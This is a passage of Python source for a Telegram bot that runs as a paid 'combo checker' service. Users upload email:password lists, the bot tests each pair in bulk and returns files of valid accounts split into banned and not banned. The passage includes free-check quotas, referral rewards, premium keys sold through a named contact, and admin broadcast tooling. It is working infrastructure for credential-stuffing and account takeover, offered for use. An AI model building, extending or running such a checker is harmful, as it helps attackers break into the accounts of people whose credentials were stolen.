        lo, pw = parts[0].strip(), parts[1].strip()
        if lo and pw:
            combos.append((lo, pw))

    if not combos:
        await status_msg.edit_text(" No valid combos found.")
        return ConversationHandler.END

    if len(combos) > MAX_COMBO_LINES:
        combos    = combos[:MAX_COMBO_LINES]

    total_raw = len(combos)

    if not prem:
        with data_lock:
            db2   = get_db()
            user2 = get_user(db2, uid)
            reset_daily_if_needed(user2)
            free_rem    = user2.get("free_checks_remaining", 0)
            ref_pts     = user2.get("referral_points", 0)
            total_avail = free_rem + ref_pts

        if total_avail <= 0:
            await status_msg.edit_text(
                f" <b>No free checks remaining!</b>\n\n"
                f"Your daily limit resets every 24 hours.\n"
                f"Use referrals to get more free checks\n"
                f"Buy premium for unlimited checking\n\n"
                f"Contact @nixzlls to buy premium.",
                parse_mode="HTML",
                reply_markup=back_keyboard()
            )
            return ConversationHandler.END

        if total_raw > total_avail:
            combos    = combos[:total_avail]
            total_raw = len(combos)

    with data_lock:
        db3 = get_db()
        ensure_db_keys(db3)
        db_count = len(db3.get("combo_database", []))

    import uuid as _uuid2
    scan_key = str(_uuid2.uuid4())[:8]
    context.user_data[f"scan_raw_{scan_key}"] = combos
    context.user_data[f"scan_prem_{scan_key}"] = prem
    context.user_data[f"scan_chat_{scan_key}"] = chat_id

    kb_scan = InlineKeyboardMarkup([
        [InlineKeyboardButton("Yes, scan & remove duplicates", callback_data=f"prescan_yes_{scan_key}")],
        [InlineKeyboardButton("No, check all of them", callback_data=f"prescan_no_{scan_key}")],
    ])
    await status_msg.edit_text(
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"  <b>FILE LOADED</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Combos loaded: <b>{total_raw:,}</b>  (max {MAX_COMBO_LINES:,}/batch)\n"
        f"Accounts in database: <b>{db_count:,}</b>\n\n"
        f"Do you want to scan your combo against the database first?\n\n"
        f"If yes, accounts already in the database will be removed from your list and sent back to you separately, then the remaining ones will be checked.",
        parse_mode="HTML",
        reply_markup=kb_scan
    )
    return AWAITING_CHECK_FILE

async def receive_semi_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the .txt file upload for Semi Info bulk checking."""
    uid     = update.effective_user.id
    doc     = update.message.document if update.message else None
    sep     = "────────────────────────"

    if not context.user_data.get("awaiting_semi_file"):
        return ConversationHandler.END

    if not doc or not doc.file_name.endswith(".txt"):
        await update.message.reply_text(
            "Please send a <b>.txt file</b> with combos.\nFormat: <code>email:password</code> per line.",
            parse_mode="HTML",
            reply_markup=back_keyboard()
        )
        return AWAITING_SEMI_EMAIL

    context.user_data["awaiting_semi_file"] = False

    with data_lock:
        db   = get_db()
        user = get_user(db, uid)
        reset_daily_if_needed(user)
        prem        = is_premium(user)
        free_rem    = user.get("free_checks_remaining", 0)
        ref_pts     = user.get("referral_points", 0)
        total_avail = free_rem + ref_pts
        save_db(db)

    status_msg = await update.message.reply_text("Processing...")

    file = await context.bot.get_file(doc.file_id)

    def _dlbar2(n, w=10):
        return "█" * n + "░" * (w - n)

    dl_msg2 = await update.message.reply_text(
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"  <b>DOWNLOADING</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"  [{_dlbar2(0)}]  0%\n"
        f"  {doc.file_name}",
        parse_mode="HTML"
    )

    dl_task2 = asyncio.create_task(file.download_as_bytearray())

    for _j in range(1, 10):
        await asyncio.sleep(0.12)
        if dl_task2.done():
            break
        try:
            await dl_msg2.edit_text(
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"  <b>DOWNLOADING</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"  [{_dlbar2(_j)}]  {_j * 10}%\n"
                f"  {doc.file_name}",
                parse_mode="HTML"
            )
        except Exception:
            pass

    buf = await dl_task2

    try:
        await dl_msg2.edit_text(
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"  <b>DOWNLOADING</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"  [{_dlbar2(10)}]  100%\n"
            f"  {doc.file_name}",
            parse_mode="HTML"
        )
        await asyncio.sleep(0.5)
        await dl_msg2.delete()
    except Exception:
        pass

    all_lines = [ln.strip() for ln in buf.decode("utf-8", errors="ignore").splitlines() if ":" in ln.strip()]

    if not all_lines:
        await status_msg.edit_text(" No valid combos found in file (format: user:pass or email:pass).")
        return ConversationHandler.END

    combos = []
    for combo in all_lines:
        parts = combo.split(":", 1)
        if len(parts) == 2:
            u, p = parts[0].strip(), parts[1].strip()
            if u and p:
                combos.append((u, p))

    if not combos:
        await status_msg.edit_text(" No valid combos found.")
        return ConversationHandler.END

    total_lines = len(combos)

    if not prem:
        if total_avail <= 0:
            await status_msg.edit_text(
                f" <b>No free checks remaining!</b>\n\n"
                f"Your daily limit resets every 24 hours.\n"
                f"• Use referrals to get more free checks\n"
                f"• Buy premium for unlimited checking\n\n"
                f"Contact @nixzlls to buy premium.",
                parse_mode="HTML",
                reply_markup=back_keyboard()
            )
            return ConversationHandler.END

        if total_lines > total_avail:
            combos      = combos[:total_avail]
            total_lines = len(combos)

        with data_lock:
            db2   = get_db()
            user2 = get_user(db2, uid)
            deduct_checks(user2, total_lines)
            save_db(db2)

    chat_id  = update.effective_chat.id
    app_loop = asyncio.get_event_loop()

    semi_st = {
        "valid":      0,
        "banned":     0,
        "invalid":    0,
        "errors":     0,
        "checked":    0,
        "total":      total_lines,
        "start_time": time.time(),
        "status_msg_id": None,
    }

    stop_kb   = InlineKeyboardMarkup([[InlineKeyboardButton("⏹ STOP", callback_data="stop_check")]])
    live_msg  = await status_msg.edit_text(
        build_semi_stats_msg(semi_st),
        parse_mode="HTML",
        reply_markup=stop_kb
    )
    semi_st["status_msg_id"] = live_msg.message_id
    stats_store[uid]   = semi_st
    chat_id_store[uid] = chat_id

    cancel_flag[uid] = False

    def _update_semi_live(st):
        pass

    def _start_semi_updater(st):
        def _loop():
            while True:
                time.sleep(3)
                msg_id = st.get("status_msg_id")
                if not msg_id:
                    break
                checked = st["checked"]
                total   = st["total"]
                done    = checked >= total
                try:
                    kb = None if done else InlineKeyboardMarkup([[InlineKeyboardButton("⏹ STOP", callback_data="stop_check")]])
                    _safe_threadsafe(
                        context.bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=msg_id,
                            text=build_semi_stats_msg(st),
                            parse_mode="HTML",
                            reply_markup=kb
                        ),
                        app_loop
                    )
                except Exception:
                    pass
                if done:
                    break
        threading.Thread(target=_loop, daemon=True).start()

    def run_semi_bulk():
        not_ban_lines = []
        ban_lines     = []

        for (email, password) in combos:
            if cancel_flag.get(uid):
                break
            result, error = do_semi_check(email, password)
            with lock:
                semi_st["checked"] += 1
            if error:
                with lock:
                    semi_st["errors"] += 1
            else:
                if result["is_banned"]:
                    with lock:
                        semi_st["valid"]  += 1
                        semi_st["banned"] += 1
                    ban_lines.append(format_semi_result_plain(email, password, result))
                else:
                    with lock:
                        semi_st["valid"] += 1
                    not_ban_lines.append(format_semi_result_plain(email, password, result))
            _update_semi_live(semi_st)

        _update_semi_live(semi_st)

        stopped    = bool(cancel_flag.get(uid))
        nb_count   = len(not_ban_lines)
        ban_count  = len(ban_lines)

        if not_ban_lines:
            nb_bytes = "\n\n".join(not_ban_lines).encode("utf-8")
            nb_buf   = io.BytesIO(nb_bytes)
            nb_buf.name = "valid_not_ban.txt"
            _safe_threadsafe(
                context.bot.send_document(
                    chat_id=chat_id,
                    document=nb_buf,
                    caption=f"<b>VALID — NOT BANNED</b> | {nb_count} account(s)",
                    parse_mode="HTML"
                ),
                app_loop
            )

        if ban_lines:
            bi_bytes = "\n\n".join(ban_lines).encode("utf-8")
            bi_buf   = io.BytesIO(bi_bytes)
            bi_buf.name = "valid_banned.txt"
            _safe_threadsafe(
                context.bot.send_document(
                    chat_id=chat_id,
                    document=bi_buf,
                    caption=f"<b>VALID — BANNED</b> | {ban_count} account(s)",
                    parse_mode="HTML"
                ),
                app_loop
            )

        ch      = semi_st["checked"]
        b       = semi_st["banned"]
        v       = semi_st["valid"]
        nb_v    = v - b
        iv      = semi_st["invalid"]
        er      = semi_st["errors"]
        elapsed = time.time() - semi_st["start_time"]
        hh = int(elapsed // 3600)
        mm = int((elapsed % 3600) // 60)
        ss = int(elapsed % 60)
        elapsed_str = f"{hh}h {mm}m {ss}s" if hh else (f"{mm}m {ss}s" if mm else f"{ss}s")
        status_line = "⏹ STOPPED" if stopped else "✅ COMPLETE"
        sep2 = "━━━━━━━━━━━━━━━━━━━━━━━━"
        summary = (
            f"{sep2}\n  <b>FINAL RESULTS — {status_line}</b>\n{sep2}\n\n"
            f"<b>CHECKED:</b>  {ch} / {total_lines}\n"
            f"<b>VALID:</b>    {v}\n"
            f"<b>INVALID:</b>  {iv}\n"
            f"<b>ERRORS:</b>   {er}\n"
            f"<b>BANNED:</b>   {b}\n"
            f"<b>NOT BANNED:</b> {nb_v}\n"
            f"<b>TIME:</b>     {elapsed_str}\n\n"
            f"<b>Powered by @nixzlls</b>"
        )
        _safe_threadsafe(
            context.bot.send_message(
                chat_id=chat_id,
                text=summary,
                parse_mode="HTML",
                reply_markup=back_keyboard()
            ),
            app_loop
        )

    _start_semi_updater(semi_st)
    threading.Thread(target=run_semi_bulk, daemon=True).start()
    return ConversationHandler.END

async def receive_semi_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Legacy stub — semi info now uses file upload."""
    return ConversationHandler.END

async def receive_feedback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get("awaiting_feedback"):
        return ConversationHandler.END
    uid   = update.effective_user.id
    uname = update.effective_user.username
    fname = update.effective_user.first_name

    context.user_data["awaiting_feedback"] = False

    fb_text = ""
    has_media = False
    if update.message.text:
        fb_text = update.message.text.strip()
    elif update.message.caption:
        fb_text   = update.message.caption.strip()
        has_media = True
    else:
        has_media = True
        fb_text   = "[media/photo/file]"

    with data_lock:
        db = get_db()
        ensure_db_keys(db)
        db["feedback"].append({
            "uid":        str(uid),
            "username":   uname,
            "first_name": fname,
            "text":       fb_text,
            "date":       datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "has_media":  has_media,
        })
        save_db(db)

    await update.message.reply_text(
        " <b>Feedback received!</b>\n\nThank you. The admin will review it.",
        parse_mode="HTML",
        reply_markup=back_keyboard()
    )

    sender_name = uname or fname or f"User{uid}"
    admin_notif = (
        f" <b>NEW FEEDBACK</b>\n\n"
        f"From: @{sender_name} (<code>{uid}</code>)\n"
        f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"Message: {fb_text[:500]}"
    )
    try:
        if has_media and update.message.photo:
            await context.bot.send_photo(
                chat_id=ADMIN_ID,
                photo=update.message.photo[-1].file_id,
                caption=admin_notif,
                parse_mode="HTML"
            )
        elif has_media and update.message.document:
            await context.bot.send_document(
                chat_id=ADMIN_ID,
                document=update.message.document.file_id,
                caption=admin_notif,
                parse_mode="HTML"
            )
        else:
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_notif, parse_mode="HTML")
    except Exception:
        pass

    return ConversationHandler.END

async def receive_announcement(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get("awaiting_announcement"):
        return ConversationHandler.END
    if update.effective_user.id != ADMIN_ID:
        return ConversationHandler.END
    context.user_data["awaiting_announcement"] = False

    ann_text = ""
    photo_id = None
    if update.message.text:
        ann_text = update.message.text.strip()
    elif update.message.caption:
        ann_text = update.message.caption.strip()
        if update.message.photo:
            photo_id = update.message.photo[-1].file_id

    with data_lock:
        db = get_db()
        ensure_db_keys(db)
        db["announcements"].append({
            "text":     ann_text,
            "photo_id": photo_id,
            "date":     datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        })
        all_uids = list(db["users"].keys())
        save_db(db)

    await update.message.reply_text(
        f" Broadcasting to {len(all_uids)} users...",
        reply_markup=back_admin_keyboard()
    )

    success = 0
    for uid_str in all_uids:
        try:
            msg_body = f" <b>ANNOUNCEMENT</b>\n\n{ann_text}"
            if photo_id:
                await context.bot.send_photo(chat_id=int(uid_str), photo=photo_id, caption=msg_body, parse_mode="HTML")
            else:
                await context.bot.send_message(chat_id=int(uid_str), text=msg_body, parse_mode="HTML")
            success += 1
        except Exception:
            pass

    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f" Announcement sent to {success}/{len(all_uids)} users.",
        parse_mode="HTML"
    )
    return ConversationHandler.END

async def receive_vote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get("awaiting_vote"):
        return ConversationHandler.END
    if update.effective_user.id != ADMIN_ID:
        return ConversationHandler.END
    context.user_data["awaiting_vote"] = False

    raw_text = ""
    photo_id = None
    if update.message.text:
        raw_text = update.message.text.strip()
    elif update.message.caption:
        raw_text = update.message.caption.strip()
        if update.message.photo:
            photo_id = update.message.photo[-1].file_id

    parts = [p.strip() for p in raw_text.split("|")]
    if len(parts) < 3:
        await update.message.reply_text(
            " Invalid format.\nUse: <code>Question | Choice1 | Choice2 | Hours</code>",
            parse_mode="HTML",
            reply_markup=back_admin_keyboard()
        )
        return ConversationHandler.END

    question = parts[0]
    try:
        hours    = int(parts[-1])
        choices  = parts[1:-1]
    except ValueError:
        hours   = 24
        choices = parts[1:]

    if len(choices) < 2:
        await update.message.reply_text(" Need at least 2 choices.", reply_markup=back_admin_keyboard())
        return ConversationHandler.END

    vote_id  = str(uuid.uuid4())[:8].upper()
    deadline = (datetime.now() + timedelta(hours=hours)).isoformat()

    vote_data = {
        "id":       vote_id,
        "question": question,
        "choices":  choices,
        "results":  {c: 0 for c in choices},
        "voters":   {},
        "deadline": deadline,
        "photo_id": photo_id,
        "closed":   False,
        "created":  datetime.now().isoformat(),
    }

    with data_lock:
        db = get_db()
        ensure_db_keys(db)
        db["votes"][vote_id] = vote_data
        all_uids = list(db["users"].keys())
        save_db(db)

    vote_text = build_vote_display(vote_data)
    vote_kb   = build_vote_keyboard(vote_id, vote_data)

    await update.message.reply_text(
        f" Vote created! Broadcasting to {len(all_uids)} users...",
        reply_markup=back_admin_keyboard()
    )

    success = 0
    for uid_str in all_uids:
        try:
            if photo_id:
                await context.bot.send_photo(
                    chat_id=int(uid_str),
                    photo=photo_id,
                    caption=vote_text,
                    parse_mode="HTML",
                    reply_markup=vote_kb
                )
            else:
                await context.bot.send_message(
                    chat_id=int(uid_str),
                    text=vote_text,
                    parse_mode="HTML",
                    reply_markup=vote_kb
                )
            success += 1
        except Exception:
            pass

    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f" Vote broadcast to {success}/{len(all_uids)} users. Vote ID: <code>{vote_id}</code>",
        parse_mode="HTML"
    )
    return ConversationHandler.END

async def receive_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get("awaiting_broadcast"):
        return ConversationHandler.END
    if update.effective_user.id != ADMIN_ID:
        return ConversationHandler.END
    context.user_data["awaiting_broadcast"] = False

    bc_text  = ""
    photo_id = None
    doc_id   = None
    if update.message.text:
        bc_text = update.message.text.strip()
    elif update.message.caption:
        bc_text = update.message.caption.strip()
        if update.message.photo:
            photo_id = update.message.photo[-1].file_id
        elif update.message.document:
            doc_id = update.message.document.file_id

    with data_lock:
        db       = get_db()
        all_uids = list(db["users"].keys())

    await update.message.reply_text(
        f" Broadcasting to {len(all_uids)} users...",
        reply_markup=back_admin_keyboard()
    )

    success = 0
    for uid_str in all_uids:
        try:
            if photo_id:
                await context.bot.send_photo(chat_id=int(uid_str), photo=photo_id, caption=bc_text, parse_mode="HTML")
            elif doc_id:
                await context.bot.send_document(chat_id=int(uid_str), document=doc_id, caption=bc_text, parse_mode="HTML")
            else:
                await context.bot.send_message(chat_id=int(uid_str), text=bc_text, parse_mode="HTML")
            success += 1
        except Exception:
            pass

    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f" Broadcast sent to {success}/{len(all_uids)} users.",
        parse_mode="HTML"
    )
    return ConversationHandler.END

async def receive_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    text = update.message.text.strip() if update.message.text else ""

    if context.user_data.get("awaiting_key"):
        context.user_data["awaiting_key"] = False
        with data_lock:
            db  = get_db()
            ok, msg = redeem_key(db, uid, text.upper())
            save_db(db)
        await update.message.reply_text(msg, reply_markup=back_keyboard())
        return ConversationHandler.END

    if context.user_data.get("awaiting_genkey") and uid == ADMIN_ID:
        context.user_data["awaiting_genkey"] = False
        key_type   = context.user_data.pop("genkey_type", "full")
        type_label = {"ban": "Ban Check Only", "semi": "Full Info Only", "full": "Both (Full Access)"}.get(key_type, "Full Access")
        parts = text.split()
        try:
            dur_val  = int(parts[0])
            dur_unit = parts[1].lower()
            max_u    = int(parts[2]) if len(parts) > 2 else 1
            custom_k = parts[3] if len(parts) > 3 else None
            with data_lock:
                db  = get_db()
                key = generate_key(db, dur_val, dur_unit, max_u, custom_k, key_type)
                save_db(db)
            await update.message.reply_text(
                f" <b>Key Generated!</b>\n\n"
                f" <code>{key}</code>\n\n"
                f"Type: <b>{type_label}</b>\n"
                f"Duration: {dur_val} {dur_unit}\n"
                f"Max Users: {max_u}",
                parse_mode="HTML",
                reply_markup=back_admin_keyboard()
            )
        except Exception as e:
            await update.message.reply_text(
                f" Invalid format. Error: {e}\n\nExample: <code>7 days 1</code>",
                parse_mode="HTML",
                reply_markup=back_admin_keyboard()
            )
        return ConversationHandler.END

    if context.user_data.get("awaiting_addpremium") and uid == ADMIN_ID:
        context.user_data["awaiting_addpremium"] = False
        parts = text.split()
        try:
            target_uid = str(parts[0])
            dur_val    = int(parts[1])
            dur_unit   = parts[2].lower()
            unit_map = {
                "minutes": timedelta(minutes=dur_val),
                "hours":   timedelta(hours=dur_val),
                "days":    timedelta(days=dur_val),
                "months":  timedelta(days=dur_val * 30),
                "years":   timedelta(days=dur_val * 365),
            }
            delta = unit_map.get(dur_unit, timedelta(days=dur_val))
            with data_lock:
                db    = get_db()
                tuser = get_user(db, target_uid)
                tuser["is_premium"]      = True
                tuser["premium_expires"] = (datetime.now() + delta).isoformat()
                save_db(db)
            await update.message.reply_text(
                f" Premium added to <code>{target_uid}</code> for {dur_val} {dur_unit}.",
                parse_mode="HTML",
                reply_markup=back_admin_keyboard()
            )
            try:
                await context.bot.send_message(
                    chat_id=int(target_uid),
                    text=f" You've been upgraded to <b>Premium</b> for {dur_val} {dur_unit}!",
                    parse_mode="HTML"
                )
            except Exception:
                pass
        except Exception as e:
            await update.message.reply_text(f" Error: {e}", reply_markup=back_admin_keyboard())
        return ConversationHandler.END

    if context.user_data.get("awaiting_revoke") and uid == ADMIN_ID:
        context.user_data["awaiting_revoke"] = False
        target_uid = text.strip()
        with data_lock:
            db    = get_db()
            tuser = get_user(db, target_uid)
            tuser["is_premium"]      = False
            tuser["premium_expires"] = None
            save_db(db)
        await update.message.reply_text(
            f" Premium revoked from <code>{target_uid}</code>.",
            parse_mode="HTML",
            reply_markup=back_admin_keyboard()
        )
        return ConversationHandler.END

    if context.user_data.get("awaiting_addchecks") and uid == ADMIN_ID:
        context.user_data["awaiting_addchecks"] = False
        parts = text.split()
        try:
            target_uid = str(parts[0])
            amount     = int(parts[1])
            with data_lock:
                db    = get_db()
                tuser = get_user(db, target_uid)
                tuser["free_checks_remaining"] = tuser.get("free_checks_remaining", 0) + amount
                save_db(db)
            await update.message.reply_text(
                f" Added {amount} free checks to <code>{target_uid}</code>.",
                parse_mode="HTML",
                reply_markup=back_admin_keyboard()
            )
            try:
                await context.bot.send_message(
                    chat_id=int(target_uid),
                    text=f" <b>+{amount} free checks</b> added to your account!",
                    parse_mode="HTML"
                )
            except Exception:
                pass
        except Exception as e:
            await update.message.reply_text(f" Error: {e}", reply_markup=back_admin_keyboard())
        return ConversationHandler.END

    if context.user_data.get("awaiting_feedback"):
        return await receive_feedback(update, context)

    if context.user_data.get("awaiting_announcement") and uid == ADMIN_ID:
        return await receive_announcement(update, context)

    if context.user_data.get("awaiting_vote") and uid == ADMIN_ID:
        return await receive_vote(update, context)

    if context.user_data.get("awaiting_broadcast") and uid == ADMIN_ID:
        return await receive_broadcast(update, context)

    return ConversationHandler.END

async def receive_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id

    if context.user_data.get("awaiting_feedback"):
        return await receive_feedback(update, context)

    if context.user_data.get("awaiting_announcement") and uid == ADMIN_ID:
        return await receive_announcement(update, context)

    if context.user_data.get("awaiting_vote") and uid == ADMIN_ID:
        return await receive_vote(update, context)

    if context.user_data.get("awaiting_broadcast") and uid == ADMIN_ID:
        return await receive_broadcast(update, context)

    return ConversationHandler.END

async def receive_genkey_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    return await receive_text(update, context)

async def cancel_conv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    cancel_flag[uid] = True
    with data_lock:
        db   = get_db()
        user = get_user(db, uid)
        save_db(db)
    await update.message.reply_text(" Cancelled.", reply_markup=main_menu_keyboard(uid, db))
    return ConversationHandler.END

async def daily_top_inviter_job(context):
    with data_lock:
        db    = get_db()
        users = db["users"]
        if not users:
            return
        now_str  = datetime.now().isoformat()
        best_uid = max(users, key=lambda u: users[u].get("referral_count", 0), default=None)
        if not best_uid:
            return
        best      = users[best_uid]
        last_bonus = best.get("last_top_inviter_bonus")
        if last_bonus:
            diff = (datetime.now() - datetime.fromisoformat(last_bonus)).total_seconds()
            if diff < 86400:
                return
        best["referral_points"]        = best.get("referral_points", 0) + TOP_INVITER_BONUS
        best["last_top_inviter_bonus"] = now_str
        save_db(db)

    uname = best.get("username") or best.get("first_name") or f"User{best_uid}"
    try:
        await context.bot.send_message(
            chat_id=int(best_uid),
            text=(
                f" <b>Top Inviter Bonus!</b>\n\n"
                f"You're today's top inviter with {best.get('referral_count', 0)} invites!\n"
                f" You received <b>+{TOP_INVITER_BONUS} free checks</b>!"
            ),
            parse_mode="HTML"
        )
    except Exception:
        pass

async def close_expired_votes_job(context):
    with data_lock:
        db = get_db()
        ensure_db_keys(db)
        changed = False
        for vote_id, vote in db.get("votes", {}).items():
            if vote.get("closed"):
                continue
            deadline = vote.get("deadline")
            if deadline:
                try:
                    if datetime.fromisoformat(deadline) < datetime.now():
                        vote["closed"] = True
                        changed = True
                        try:
                            results  = vote.get("results", {})
                            total_v  = sum(results.values())
                            result_text = f" <b>VOTE CLOSED: {vote.get('question', '?')}</b>\n\n"
                            for choice, cnt in results.items():
                                pct = int(cnt / total_v * 100) if total_v else 0
                                result_text += f"  {choice}: {cnt} votes ({pct}%)\n"
                            result_text += f"\nTotal votes: {total_v}"
                            for uid_str in db["users"]:
                                try:
                                    asyncio.ensure_future(context.bot.send_message(
                                        chat_id=int(uid_str),
                                        text=result_text,
                                        parse_mode="HTML"
                                    ))
                                except Exception:
                                    pass
                        except Exception:
                            pass
                except Exception:
                    pass
        if changed:
            save_db(db)

def main():
    app = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("start", start),
            CallbackQueryHandler(button_handler),
        ],
        states={
            AWAITING_CHECK_FILE: [
                MessageHandler(filters.Document.ALL, receive_check_file),
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
                CallbackQueryHandler(button_handler),
            ],
            AWAITING_GENKEY_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_genkey_input),
                CallbackQueryHandler(button_handler),
            ],
            AWAITING_SEMI_EMAIL: [
                MessageHandler(filters.Document.ALL, receive_semi_email),
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_semi_email),
                CallbackQueryHandler(button_handler),
            ],
            AWAITING_SEMI_PASSWORD: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_semi_password),
                CallbackQueryHandler(button_handler),
            ],
            AWAITING_BAN_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_ban_input),
                CallbackQueryHandler(button_handler),
            ],
            AWAITING_FEEDBACK_MSG: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_feedback),
                MessageHandler(filters.PHOTO | filters.Document.ALL, receive_feedback),
                CallbackQueryHandler(button_handler),
            ],
            AWAITING_ANNOUNCEMENT_MSG: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_announcement),
                MessageHandler(filters.PHOTO | filters.Document.ALL, receive_announcement),
                CallbackQueryHandler(button_handler),
            ],
            AWAITING_VOTE_MSG: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_vote),
                MessageHandler(filters.PHOTO | filters.Document.ALL, receive_vote),
                CallbackQueryHandler(button_handler),
            ],
            AWAITING_ADDCHECKS_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
                CallbackQueryHandler(button_handler),
            ],
            AWAITING_BROADCAST_MSG: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_broadcast),
                MessageHandler(filters.PHOTO | filters.Document.ALL, receive_broadcast),
                CallbackQueryHandler(button_handler),
            ],
        },
        fallbacks=[
            CommandHandler("cancel", cancel_conv),
            CommandHandler("start", start),
            CommandHandler("key", key_command),
        ],
        per_message=False,
    )

    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("key", key_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text))
    app.add_handler(MessageHandler(filters.PHOTO | filters.Document.ALL, receive_media))

    if app.job_queue:
        app.job_queue.run_repeating(daily_top_inviter_job, interval=86400, first=86400)
        app.job_queue.run_repeating(close_expired_votes_job, interval=60, first=60)

    app.run_polling()

if __name__ == "__main__":
    main()
